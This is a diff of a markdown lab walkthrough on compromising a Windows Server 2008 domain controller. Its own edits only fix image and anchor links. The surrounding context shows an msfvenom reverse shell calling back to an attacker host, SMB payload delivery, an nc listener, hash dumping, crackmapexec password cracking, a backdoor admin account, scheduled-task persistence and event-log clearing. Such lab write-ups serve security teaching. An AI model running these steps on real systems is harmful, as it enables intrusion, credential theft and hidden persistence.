@@ -18,7 +18,7 @@ Make sure that the systems are on, the assigned addresses are correct. You can a
 
 From WS2008-DomainController, as the Administrator user, we can run the `Get-ADUser -Filter * | Select-Object -ExpandProperty DistinguishedName` to list all users with DNs.
 
-![ad list](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img2.jpeg)
+![ad list](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img2.jpeg?raw=true)
 
 Be aware of them as we need them later on.
 
@@ -32,7 +32,7 @@ We can break the process into a few phases: discovery, exploitation, and privile
 
 Gather information about the network and identify objects in Active Directory, user rights, and security settings. This can be done by scanning the network for open ports, identifying services, and extracting information on AD objects.
 
-As seen in the [Prerequisistes](#Prerequisistes) chapter we already know some things about our network, the IP addresses, AD users. In a real case scenario, like production, this process would be much more comprehensive.
+As seen in the Prerequisistes chapter we already know some things about our network, the IP addresses, AD users. In a real case scenario, like production, this process would be much more comprehensive.
 
 This can be done remotely as well if the attacker has access to the system. Windows Server 2008 is outdated already and can be easly exploited. In this sense let's analyze using `nmap` the ports of interest that could help us for the attack. We will run the following command on our Kali machine:
 
@@ -58,7 +58,7 @@ It will probably return an error because of the wrong passwords. You can request
 
 A good example:
 
-![ldapsearch good](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img5.jpeg)
+![ldapsearch good](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img5.jpeg?raw=true)
 
 You can also use `get-acl` and `dsacls` to check the security descriptors and permissions on AD objects. These tools can show which users or groups have specific rights to change attributes or even escalate privileges.
 
@@ -86,7 +86,7 @@ We are going to use the `shell_reverse_tcp` payload for the x64 architecture ope
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.80.0.17 LPORT=4444 -f exe -o reverse.exe
 ```
 
-![msfvenom](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img6.jpeg)
+![msfvenom](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img6.jpeg?raw=true)
 
 Then we are going to host it and deliver it via SMB share, phishing, RCE exploit:
 
@@ -94,7 +94,7 @@ Then we are going to host it and deliver it via SMB share, phishing, RCE exploit
 sudo impacket-smbserver share $(pwd)
 ```
 
-![smb server](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img7.jpeg)
+![smb server](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img7.jpeg?raw=true)
 
 Note: use another path if your executable file is not located in the working directory.
 
@@ -104,7 +104,7 @@ The next step is to use netcat to wait and catch the shell when the delivered sc
 nc -lvnp 4444
 ```
 
-![listening](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img9.jpeg)
+![listening](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img9.jpeg?raw=true)
 
 Next we are going to discuss how to deliver.
 
@@ -142,15 +142,15 @@ exit
 
 When executed it looks like that:
 
-![congrats](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img12.jpeg)
+![congrats](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img12.jpeg?raw=true)
 
 Running `dascls` as an example:
 
-![dsacls](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img10.jpeg)
+![dsacls](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img10.jpeg?raw=true)
 
 After closing the session the `reverse.exe` process will crash, but it doesn't matter as we already finished our job.
 
-![crash](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img8.jpeg)
+![crash](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img8.jpeg?raw=true)
 
 It may look pretty shady, but it is useful and a good example for our case. Again, feel free to explore other ways of how to gain remote command execution using tools like `evil-winrm` or `crackmapexec`.
 
@@ -160,7 +160,7 @@ For demonstration purposes we are going to use a `.bat` script, as well as a `.p
 
 We will analyze user _jack_ that has administrative roles, how to exploit that roles, how to create a scheduled task for persistence and later how to do a cleanup to remove your traces.
 
-![query user on jack](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img11.jpeg)
+![query user on jack](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img11.jpeg?raw=true)
 
 We can check the roles using the command we used at the beginning to list all users with DNs.
 
@@ -170,7 +170,7 @@ If you have access to any Windows machine where jack or another user logged in, 
 
 To obtain the hashes you can use `secretsdump.py` from the Impacket collection of tools. Command attached in the image.
 
-![hashes](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img4.jpeg)
+![hashes](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img4.jpeg?raw=true)
 
 After getting the hashes you can save them in a file called `hashes.txt` and use the following command:
 
@@ -184,7 +184,7 @@ For this laboratory we used `crackmapexec` directly with the `rockyou.txt` dicti
 crackmapexec smb 10.80.0.2 -u jack -P /usr/share/wordlists/rockyou.txt
 ```
 
-![crack password](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img1.jpeg)
+![crack password](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img1.jpeg?raw=true)
 
 You obtained the password! Now you can use it to your advantage.
 
@@ -209,7 +209,7 @@ net user backdooradmin S3cur3P@ssw0rd /add
 net localgroup Administrators backdooradmin /add
 ```
 
-![create admin](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img14.jpeg)
+![create admin](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img14.jpeg?raw=true)
 
 Verify admin user was created:
 
@@ -217,7 +217,7 @@ Verify admin user was created:
 net user backdooradmin
 ```
 
-![verify admin](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img15.jpeg)
+![verify admin](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img15.jpeg?raw=true)
 
 Now using a powershell script saved as `.ps1`:
 
@@ -229,7 +229,7 @@ Get-ADGroupMember -Identity "Finance"
 
 This adds user `backdooradmin` to `Finance` global security group in domain `GISClab`.
 
-![add to finance](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img17.jpeg)
+![add to finance](https://github.com/LunaLynx12/GISC/blob/main/wiki/Attack%20Scripts/Andrei%20Chiper/images/img17.jpeg?raw=true)
 
 #### Scheduled task for persistence
 
@@ -249,5 +249,5 @@ Clear-EventLog -LogName System
 Clear-EventLog -LogName Application
 ```
 
-Note: If there in the topology of the network a pfsense is attached that specific system will raise an alarm of this incident. The system will also announce about any [Scheduled tasks for persistence](#Scheduled) that take place.
+Note: If there in the topology of the network a pfsense is attached that specific system will raise an alarm of this incident. The system will also announce about any scheduled tasks for persistence that take place.
 
